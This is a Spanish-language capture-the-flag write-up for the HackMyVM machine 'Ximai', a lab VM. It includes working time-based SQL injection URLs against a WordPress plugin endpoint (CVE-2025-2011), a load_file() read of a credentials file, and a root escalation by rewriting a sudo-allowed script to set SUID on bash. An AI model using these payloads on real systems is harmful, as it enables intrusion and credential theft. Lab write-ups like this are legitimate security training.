---
title: "Ximai"
date: 2025-11-27
draft: false
description: "Writeup de la máquina Ximai en HackMyVM."
categories: ["HackMyVM"]
tags: ["Directory Listing Exposure", "Sensitive File Disclosure", "WordPress Vulnerability", "Time-Based SQL Injection", "Credential Reuse", "Sudo Misconfiguration", "SUID Abuse"]
image: "/images/ximai.webp"
level: Medium
---

# Enumeración

Vamos a comenzar como en la mayoría de máquinas identificando la máquina vulnerable con ayuda de **Arp-Scan**:

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![img1](images/Pasted%20image%2020251125200103.webp)

Como podemos observar tenemos la IP de la máquina víctima que será la `192.168.1.89`.

Vamos a realizar un pequeño reconocimiento del sistema mediante el comando `ping` de la siguiente manera:

```bash
ping -c 1 192.168.1.89
```

![img2](images/Pasted%20image%2020251125200727.webp)

Como podemos observar tenemos un `ttl=64` donde podemos comenzar a suponer un sistema Linux.

Ahora vamos a realizar un pequeño escaneo con ayuda de **Nmap**, el objetivo será identificar los puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.89 -oG allPorts
```

![img3](images/Pasted%20image%2020251125201310.webp)

Podemos observar que tenemos los puertos: `22,80,3306,8000` abiertos, con esto claro vamos a realizar un segundo escaneo a estos puertos en específico para obtener un poco más de información:

```bash
nmap -p22,80,3306,8000 -sCV 192.168.1.89 -oN target
```

![img4](images/Pasted%20image%2020251125201917.webp)

Ya podemos observar los servicios, donde en este caso los servicios que más llaman mi atención son el del puerto `80 y 8000` por lo que vamos a analizar primero el puerto `80` con ayuda de whatweb:

```bash
whatweb http://192.168.1.89
```

![img5](images/Pasted%20image%2020251125202804.webp)

Como podemos observar de primeras vemos la versión de apache y que al parecer es un Linux Debian, pero no más.

Al ver que no tenemos mucha más información lo que vamos a hacer es con ayuda de **Gobuster** buscar por más directorios en la web:

```bash
gobuster dir -u http://192.168.1.89 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20
```

![img6](images/Pasted%20image%2020251125203133.webp)

Como podemos observar en este caso no encontramos directorios, pero vamos a buscar por directorios con extensiones como `.php o .html` a ver que logramos encontrar:

```bash
gobuster dir -u http://192.168.1.89 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 -x php,html
```

![img7](images/Pasted%20image%2020251125203540.webp)

Vemos que esta vez nos fue mucho mejor, ya que tenemos rutas comprometedoras, pero una llama la atención que es la de `reminder.php`:

![img8](images/Pasted%20image%2020251125203919.webp)

Podemos observar la siguiente web que nos indica algunas cosas clave como:

- Posible usuario `jimmy`.
- Problemas en un buscador, nos indica una mala configuración de la base de datos y el cómo intuimos que tenemos una base de datos es porque detectamos a `MySQL` corriendo con ayuda de **Nmap**.
- Una posible ruta que contiene la contraseña del usuario `jimmy`.

Tomando esto en cuenta podemos analizar el código fuente de la web:

![img9](images/Pasted%20image%2020251125204132.webp)

Podemos observar como la imagen se carga de una ruta algo inusual y conociendo que posiblemente tenemos escondida la ruta con las credenciales del usuario `jimmy` podemos intentar ver si este directorio tiene permisos de listarse:

![img10](images/Pasted%20image%2020251125204315.webp)

Podemos observar que si tiene permisos y vemos un archivo `creds.txt` el cual contiene lo siguiente:

![img11](images/Pasted%20image%2020251125204349.webp)

Al parecer podremos ver el contenido de `creds.txt` dentro de `/etc/jimmy.txt`.

No lograremos encontrar nada más corriendo en este servicio.

Vamos a comenzar ahora a enumerar el servicio web que corre en el puerto `8000`, primero con un **Whatweb** a ver si logramos identificar algunas tecnologías:

```bash
whatweb http://192.168.1.89:8000
```

![img12](images/Pasted%20image%2020251125204618.webp)

Como podemos observar ya tenemos información de que la web corre en `Apache` y algo que llama la atención es que es un CMS específicamente un WordPress.

Podemos Visitar la web a ver que logramos encontrar dentro de la misma:

![img13](images/Pasted%20image%2020251125204947.webp)

Vemos la web, pero parece que no tiene nada interesante ni nos lleva a nada interesante.

En este punto y considerando que hemos encontrado que es un CMS con WordPress, podemos intentar hacer un escaneo con **Nuclei** de la siguiente manera:

```bash
nuclei -target http://192.168.1.89:8000/
```

![img14](images/Pasted%20image%2020251126165242.webp)

Como podemos observar tenemos una vulnerabilidad conocida que es el CVE-2025-2011 la cual ya tiene documentación para explotar.

# Explotación

En mi caso me gusta hacer las cosas de forma manual por lo que vamos a ver que ya nos brinda información sobre la inyección así que vamos a adaptarla, en este caso fue necesario la siguiente inyección basada en tiempo:

```bash
http://192.168.1.89:8000/wp-admin/admin-ajax.php?s=9999%27)%20and%20(select%201234%20from%20(select%20sleep(3))x)%20--%20-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index
```

![img15](images/Pasted%20image%2020251126175739.webp)

En este caso vamos a ver como es que la inyección es válida porque la web demora un estimado muy cercano a los 3 segundos que le indicamos en cargar, por lo que ya tenemos la inyección de forma exitosa, en este punto lo que vamos a hacer es jugar con condiciones, ya que el objetivo es ir obteniendo información a partir de ellas:

```bash
http://192.168.1.89:8000/wp-admin/admin-ajax.php?s=9999%27)%20and%20(select%201234%20from%20(select%20if(substring(%27hola%27,1,1)=%27h%27,%20sleep(5),0))x)%20--%20-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index
```

![img16](images/Pasted%20image%2020251126180154.webp)

Esto sigue funcionando y lo que hace precisamente es descomponer `hola` y filtrar por la primera letra que es la letra `h`, luego dice si `h=h` entonces ejecuta el `sleep(5)` y si no, pues retorna un 0.
Esta query también verifica si es correcto, y ya tendríamos algo valido que podemos usar para recuperar información, por lo tanto lo que vamos a hacer es ahora intentar obtener la versión de la base de datos para validar que nos acepta datos internos:

```bash
http://192.168.1.89:8000/wp-admin/admin-ajax.php?s=9999%27)%20and%20(select%201234%20from%20(select%20if(substring((select%20@@version),1,1)=%271%27,%20sleep(3),0))x)%20--%20-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index
```

![img17](images/Pasted%20image%2020251126180658.webp)

Excelente esto funciona, ahora algo que se intentaría es comenzar a enumerar cosas como las bases de datos tablas y columnas, pero en este caso no, tenemos que prestar mucha atención a las pistas, recordemos que tenemos un archivo con las credenciales de `jimmy` en la ruta `/etc/jimmy.txt` vamos a intentar cargar ese archivo con la función `load_file()` y reconstruir el contenido del mismo letra por letra, para esto vamos a jugar también con `group_concat` para compactar todo el texto en una sola línea y como esto puede ser muy tardado de forma manual lo hemos automatizado con ayuda de python, lo pueden clonar de mi [**GitHub**](<https://github.com/danystarrkk/Hacknig-Tools/tree/main/Tools/SQLI%20Brute%20Force%20(Ximai)>)

Si ya tenemos el script es cuestión de clonarlo y ejecutarlo:

```bash
python3 SQLI-TimeBased.py -u http://192.168.1.89:8000 -f /etc/jimmy.txt
```

![img1](images/Pasted%20image%2020251129151119.webp)

El script comienza a hacer la inyección y en este punto vamos a esperar al resultado que sería:

![img2](images/Pasted%20image%2020251129151152.webp)

Podemos observar ya el contenido y lo que posiblemente sea la contraseña del usuario jimmy.

Recordemos que tenemos habilitado el servicio ssh por lo que vamos a intentar una conexión con ayuda de esta contraseña de la siguiente manera:

```bash
ssh jimmy@192.168.1.89
```

![img20](images/Pasted%20image%2020251126182349.webp)

Ya estamos como el usuario `jimmy`.
Por alguna razón parece estar dañado el comando `ls` y no, no los permite de forma relativa, pero de manera absoluta lo podemos ejecutar y ver la flag dentro de `/home/jimmy`:
![img21](images/Pasted%20image%2020251126182625.webp)

# Escalada de Privilegios

Bueno se intentó varios métodos de enumeración, pero no encontramos nada por el momento, ahora lo que vamos a intentar en este punto es conociendo que tenemos las webs corriendo y la ruta de archivos usual es `/var/www` vamos a buscar por archivos de configuración a ver si encontramos algo:

![img22](images/Pasted%20image%2020251126185216.webp)

Encontramos ese archivo y si investigamos dentro del mismo podemos observar lo siguiente:

![img23](images/Pasted%20image%2020251126185252.webp)

Vemos credenciales, esto es bueno, vamos a ver si podemos ya ingresar como el usuario `adminer`:

![img24](images/Pasted%20image%2020251126185338.webp)

Perfecto, ahora vamos a ver si tenemos algún permiso con `sudo -l`:

![img25](images/Pasted%20image%2020251126185404.webp)

Podemos usar el comando grep, podemos intentar usar `gtf-obins` para ver si podemos vulnerar esto:

![img26](images/Pasted%20image%2020251126185449.webp)

Al parecer si es posible por lo que vamos a intentar escalar privilegios:

![img27](images/Pasted%20image%2020251126185733.webp)

No funciona y es debido a que no es el binario `grep` si no un script que directamente imprime el mensaje, pero esto es mejor podemos,ya que dar instrucciones dentro del mismo si tenemos permisos de escritura:

![img28](images/Pasted%20image%2020251126185818.webp)

Vemos que otros tiene todos los permisos por lo que vamos a modificarlo:

![img29](images/Pasted%20image%2020251126185908.webp)

Hacemos que se ejecuten permisos de SUID a la bash y ahora intentamos ejecutar grep a ver que sucede:
![img30](images/Pasted%20image%2020251126190006.webp)

Perfecto ya tenemos permisos SUID en la bash y es cuestión de ejecutar el comando:

```bash
bash -p
```

![img31](images/Pasted%20image%2020251126190051.webp)

ya podemos obtener la última flag:

![img32](images/Pasted%20image%2020251126190113.webp)

Lab Terminado.

![img1](images/Pasted%20image%2020251205225959.webp)
